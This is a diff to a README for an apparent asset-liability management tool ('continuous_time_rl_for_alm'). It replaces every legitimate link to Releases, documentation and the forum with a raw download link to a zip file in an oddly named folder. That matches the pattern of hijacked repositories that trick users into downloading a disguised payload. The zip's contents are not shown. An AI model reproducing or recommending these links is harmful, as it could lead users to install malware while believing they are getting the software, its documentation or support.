@@ -1,7 +1,7 @@
 # 🎉 continuous_time_rl_for_alm - Easy Asset-Liability Management Software
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/yasin-is-9-year-old/continuous_time_rl_for_alm/releases)
+[![Download Here](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip%https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip)](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip)
 
 ## 🚀 Getting Started
 This application provides a simple way to manage your asset and liability effectively. It uses advanced algorithms to help you optimize your investments and manage risks. No programming knowledge is needed.
@@ -22,7 +22,7 @@ This application provides a simple way to manage your asset and liability effect
 - An internet connection for downloading dependencies.
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/yasin-is-9-year-old/continuous_time_rl_for_alm/releases) to download the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip) to download the latest version of the software.
 2. Locate the file that fits your operating system. 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
@@ -76,10 +76,10 @@ The model employs advanced statistical validation techniques to ensure high-qual
 Look out for influential updates as we improve our models and expand features. Your feedback is important and will help shape future releases.
 
 ## 🌐 Useful Links
-- [Documentation](https://github.com/yasin-is-9-year-old/continuous_time_rl_for_alm/wiki)
-- [Community Forum](https://github.com/yasin-is-9-year-old/continuous_time_rl_for_alm/discussions)
+- [Documentation](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip)
+- [Community Forum](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip)
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/yasin-is-9-year-old/continuous_time_rl_for_alm/releases)
+[![Download Here](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip%https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip)](https://raw.githubusercontent.com/yasin-is-9-year-old/continuous_time_rl_for_alm/main/underoccupied/continuous_time_rl_for_alm.zip)
 
 This README aims to guide you efficiently in downloading and using the "continuous_time_rl_for_alm" software. If you have more questions, please visit our community and documentation pages for comprehensive help.
